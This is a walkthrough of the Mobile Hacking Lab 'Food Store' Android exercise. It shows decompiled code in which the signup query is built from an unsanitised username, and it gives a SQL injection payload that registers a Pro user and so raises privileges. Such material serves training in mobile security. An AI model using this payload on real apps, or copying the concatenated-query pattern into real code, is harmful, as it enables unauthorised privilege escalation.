---
layout: post
title: Food Store - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Food Store](https://www.mobilehackinglab.com/course/lab-food-store) lab aims to explore a SQL Injection (SQLi) vulnerability in order to elevate our privileges within an Android application.<!--more--> In this article, we'll walk through the steps to register as a pro user.

### Introduction

When we open the application, we encounter a screen that allows us to enter a username and password to login or create an account if we don't have one. After authentication, we gain access to an application to order food and see if our user type is Regular or Pro. Let's delve into the code to discover how we can create a pro user.

### Static Analysis

In the `Signup` class, where account creation takes place, there is an intriguing function within its `onCreate` method: `dbHelper.addUser(newUser)`. This function is responsible for adding a new user to the database. It takes a User object as input, which is instantiated with the username, password, and address entered by the user on the Signup screen.

```java
// Signup
package com.mobilehackinglab.foodstore;

...
import kotlin.text.StringsKt;

/* compiled from: Signup.kt */
@Metadata(m24d1 = {"\u0000&\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0012\u0010\n\u001a\u00020\u000b2\b\u0010\f\u001a\u0004\u0018\u00010\rH\u0014R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\u0006X\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000¨\u0006\u000e"}, m23d2 = {"Lcom/mobilehackinglab/foodstore/Signup;", "Landroidx/appcompat/app/AppCompatActivity;", "()V", "address", "Landroid/widget/EditText;", "backBtn", "Landroid/widget/Button;", "password", "signupBtn", "username", "onCreate", "", "savedInstanceState", "Landroid/os/Bundle;", "app_debug"}, m22k = 1, m21mv = {1, 9, 0}, m19xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes3.dex */
public final class Signup extends AppCompatActivity {
    private EditText address;
    private Button backBtn;
    private EditText password;
    private Button signupBtn;
    private EditText username;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0892R.layout.activity_signup);
        View findViewById = findViewById(C0892R.C0895id.username);
        Intrinsics.checkNotNullExpressionValue(findViewById, "findViewById(...)");
        this.username = (EditText) findViewById;
        View findViewById2 = findViewById(C0892R.C0895id.password);
        Intrinsics.checkNotNullExpressionValue(findViewById2, "findViewById(...)");
        this.password = (EditText) findViewById2;
        View findViewById3 = findViewById(C0892R.C0895id.address);
        Intrinsics.checkNotNullExpressionValue(findViewById3, "findViewById(...)");
        this.address = (EditText) findViewById3;
        View findViewById4 = findViewById(C0892R.C0895id.back_);
        Intrinsics.checkNotNullExpressionValue(findViewById4, "findViewById(...)");
        this.backBtn = (Button) findViewById4;
        View findViewById5 = findViewById(C0892R.C0895id.sign_up);
        Intrinsics.checkNotNullExpressionValue(findViewById5, "findViewById(...)");
        Button button = (Button) findViewById5;
        this.signupBtn = button;
        Button button2 = null;
        if (button == null) {
            Intrinsics.throwUninitializedPropertyAccessException("signupBtn");
            button = null;
        }
        button.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.foodstore.Signup$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                Signup.onCreate$lambda$0(Signup.this, view);
            }
        });
        Button button3 = this.backBtn;
        if (button3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("backBtn");
        } else {
            button2 = button3;
        }
        button2.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.foodstore.Signup$$ExternalSyntheticLambda1
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                Signup.onCreate$lambda$1(Signup.this, view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$0(Signup this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        EditText editText = this$0.username;
        EditText editText2 = null;
        if (editText == null) {
            Intrinsics.throwUninitializedPropertyAccessException("username");
            editText = null;
        }
        if (!(StringsKt.trim((CharSequence) editText.getText().toString()).toString().length() == 0)) {
            EditText editText3 = this$0.password;
            if (editText3 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("password");
                editText3 = null;
            }
            if (!(StringsKt.trim((CharSequence) editText3.getText().toString()).toString().length() == 0)) {
                EditText editText4 = this$0.address;
                if (editText4 == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("address");
                    editText4 = null;
                }
                if (!(StringsKt.trim((CharSequence) editText4.getText().toString()).toString().length() == 0)) {
                    DBHelper dbHelper = new DBHelper(this$0);
                    EditText editText5 = this$0.username;
                    if (editText5 == null) {
                        Intrinsics.throwUninitializedPropertyAccessException("username");
                        editText5 = null;
                    }
                    String obj = editText5.getText().toString();
                    EditText editText6 = this$0.password;
                    if (editText6 == null) {
                        Intrinsics.throwUninitializedPropertyAccessException("password");
                        editText6 = null;
                    }
                    String obj2 = editText6.getText().toString();
                    EditText editText7 = this$0.address;
                    if (editText7 == null) {
                        Intrinsics.throwUninitializedPropertyAccessException("address");
                    } else {
                        editText2 = editText7;
                    }
                    User newUser = new User(0, obj, obj2, editText2.getText().toString(), false, 1, null);
                    dbHelper.addUser(newUser);
                    Toast.makeText(this$0, "User Registered Successfully", 0).show();
                    return;
                }
            }
        }
        Toast.makeText(this$0, "Please fill in all fields", 0).show();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$1(Signup this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.finish();
    }
}
```

The `DBHelper` class, is responsible for user creation and login within the application and contains the `addUser` function. This function receives a `User` object as a parameter and executes a query to the database to create the user, passing the values of the password and address as base64 encoded and the username in plain text.

```java
//DBHelper
package com.mobilehackinglab.foodstore;

..
import kotlin.text.Charsets;

/* compiled from: DBHelper.kt */
@Metadata(m24d1 = {"\u00008\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\b\n\u0002\b\u0003\u0018\u0000 \u00132\u00020\u0001:\u0001\u0013B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003¢\u0006\u0002\u0010\u0004J\u000e\u0010\u0005\u001a\u00020\u00062\u0006\u0010\u0007\u001a\u00020\bJ\u0010\u0010\t\u001a\u0004\u0018\u00010\b2\u0006\u0010\n\u001a\u00020\u000bJ\u0010\u0010\f\u001a\u00020\u00062\u0006\u0010\r\u001a\u00020\u000eH\u0016J \u0010\u000f\u001a\u00020\u00062\u0006\u0010\r\u001a\u00020\u000e2\u0006\u0010\u0010\u001a\u00020\u00112\u0006\u0010\u0012\u001a\u00020\u0011H\u0016¨\u0006\u0014"}, m23d2 = {"Lcom/mobilehackinglab/foodstore/DBHelper;", "Landroid/database/sqlite/SQLiteOpenHelper;", "context", "Landroid/content/Context;", "(Landroid/content/Context;)V", "addUser", "", "user", "Lcom/mobilehackinglab/foodstore/User;", "getUserByUsername", "Username", "", "onCreate", "db", "Landroid/database/sqlite/SQLiteDatabase;", "onUpgrade", "oldVersion", "", "newVersion", "Companion", "app_debug"}, m22k = 1, m21mv = {1, 9, 0}, m19xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes3.dex */
public final class DBHelper extends SQLiteOpenHelper {
    public static final Companion Companion = new Companion(null);
    public static final String DATABASE_NAME = "userdatabase.db";
    public static final int DATABASE_VERSION = 1;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public DBHelper(Context context) {
        super(context, DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, 1);
        Intrinsics.checkNotNullParameter(context, "context");
    }

    /* compiled from: DBHelper.kt */
    @Metadata(m24d1 = {"\u0000\u0018\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\b\n\u0000\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0086T¢\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0086T¢\u0006\u0002\n\u0000¨\u0006\u0007"}, m23d2 = {"Lcom/mobilehackinglab/foodstore/DBHelper$Companion;", "", "()V", "DATABASE_NAME", "", "DATABASE_VERSION", "", "app_debug"}, m22k = 1, m21mv = {1, 9, 0}, m19xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes3.dex */
    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }
    }

    @Override // android.database.sqlite.SQLiteOpenHelper
    public void onCreate(SQLiteDatabase db) {
        Intrinsics.checkNotNullParameter(db, "db");
        db.execSQL("CREATE TABLE users (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    username TEXT,\n    password TEXT,\n    address TEXT,\n    isPro INTEGER\n    \n    \n)");
    }

    @Override // android.database.sqlite.SQLiteOpenHelper
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        Intrinsics.checkNotNullParameter(db, "db");
    }

    public final void addUser(User user) {
        Intrinsics.checkNotNullParameter(user, "user");
        SQLiteDatabase db = getWritableDatabase();
        byte[] bytes = user.getPassword().getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(bytes, "this as java.lang.String).getBytes(charset)");
        String encodedPassword = Base64.encodeToString(bytes, 0);
        String Username = user.getUsername();
        byte[] bytes2 = user.getAddress().getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(bytes2, "this as java.lang.String).getBytes(charset)");
        String encodedAddress = Base64.encodeToString(bytes2, 0);
        String sql = "INSERT INTO users (username, password, address, isPro) VALUES ('" + Username + "', '" + encodedPassword + "', '" + encodedAddress + "', 0)";
        db.execSQL(sql);
        db.close();
    }

    public final User getUserByUsername(String Username) {
        Intrinsics.checkNotNullParameter(Username, "Username");
        SQLiteDatabase db = getReadableDatabase();
        Cursor cursor = db.query("users", new String[]{"id", "username", "password", "address", "isPro"}, "username = ?", new String[]{Username}, null, null, null);
        User user = null;
        if (cursor.moveToFirst()) {
            String encodedPassword = cursor.getString(cursor.getColumnIndexOrThrow("password"));
            String encodedAddress = cursor.getString(cursor.getColumnIndexOrThrow("address"));
            byte[] decode = Base64.decode(encodedPassword, 0);
            Intrinsics.checkNotNullExpressionValue(decode, "decode(...)");
            String decodedPassword = new String(decode, Charsets.UTF_8);
            byte[] decode2 = Base64.decode(encodedAddress, 0);
            Intrinsics.checkNotNullExpressionValue(decode2, "decode(...)");
            String decodedAddress = new String(decode2, Charsets.UTF_8);
            user = new User(cursor.getInt(cursor.getColumnIndexOrThrow("id")), Username, decodedPassword, decodedAddress, cursor.getInt(cursor.getColumnIndexOrThrow("isPro")) == 1);
        }
        cursor.close();
        return user;
    }
}
```

In other words, we can see that the `addUser` function is vulnerable to SQL Injection because when creating the `sql` variable, the text passed to create the query is not sanitized, allowing modification of the query to add new values. We only have injection through the `username` field since the values of password and address are base64 encoded.

### Exploiting the app

To exploit this vulnerability, all we need to do is create a user with a random value as password and address, and inject our payload into the username field:
```
go','Z28=','Z28=',1)--
```

This creates a user named "go" with the password "go" and sets the `isPro` value to true. The `--` at the end comments out the rest of the query.

Behind the scenes, the `sql` variable will have the value:
```sql
INSERT INTO users (username, password, address, isPro) VALUES ('go','Z28=','Z28=',1)--, 'some_value', 'some_value', 0)
```

After creating the user, all we need to do is log in to the application and see that we are logged in as Pro users.

### Conclusion

This lab demonstrates a SQL injection flaw within an Android application and how it can lead to the modification of values that should not be altered. For a hands-on experience with these concepts, visit the [MobileHackingLab - Food Store](https://www.mobilehackinglab.com/course/lab-food-store) and embark on a journey of discovery to enhance your skills in mobile security.